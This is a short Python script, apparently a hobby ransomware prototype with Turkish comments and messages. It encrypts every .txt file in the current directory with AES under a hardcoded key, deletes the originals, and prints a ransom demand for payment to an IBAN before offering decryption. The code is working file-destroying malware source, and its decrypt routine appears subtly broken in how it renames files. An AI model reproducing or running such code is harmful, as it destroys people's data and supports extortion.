import base64
import pyaes
import os

files = []
files2 = []
#hangi dizine gidileceği ve hangi uzantılı doyaların şifrelenecek dışardan belirtilebilir.get_info()
def get_files():
    directory = os.getcwd()
    dir = os.listdir(directory)
    for  a in dir:
        if a.endswith('txt'):
            files.append(a)
    print("Şifrelenecek txt dosyalar")
    for i in files:
        print("+",i)

def encrypt(filename,key):
    aes = pyaes.AESModeOfOperationCTR(key)
    try:
        fb = open(filename,'rb').read()
        nb = aes.encrypt(fb)

        new = open(filename+".vkng",'wb')
        new.write(nb)
        new.flush()
        new.close()
    except:
        pass

def message(files):
    message ="""
    Tüm txt uzantılı dosyalarınızı --> {} <-- şifreledim.Dosyalarınızı geri istiyorsanız
     aşağıdaki IBAN numarasına 1tl göndermek zorundasınız.
    IBAN:TRXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    """.format(str(files))
    print(message)

def decrypt(key):
    aes = pyaes.AESModeOfOperationCTR(key)
    say = 1
    directory = os.getcwd()
    dir = os.listdir(directory)
    for a in dir:
        if a.endswith('vkng'):
            files2.append(a)

    for i in files2:
        os.rename(i,i.replace('vkng',''))

    for i in os.listdir(directory):
        if i.endswith('txt'):
            f = open(i,'rb').read()
            nb = aes.decrypt(f)

            new = open("dosya"+str(say)+".txt", 'wb')
            new.write(nb)
            new.flush()
            new.close()
            say = say+1


if __name__=='__main__':
    os.system("color a")
    key = base64.b64decode("rJW37PkmNOfbCq7CT1udRw==")
    get_files()
    for filename in files:
        encrypt(filename,key)
    for filename in files:
        os.remove(filename)
    message(files)
    print("Ödeme yapıldı mı?")
    ans = input("Cevap: ")
    if ans =='e' or ans =='E':
        print("Aferim sana işte dosyaların")
        decrypt(key)
    else:
        print("Sen bilin ben kaçar ozaman :DDD")
        os.system("exit")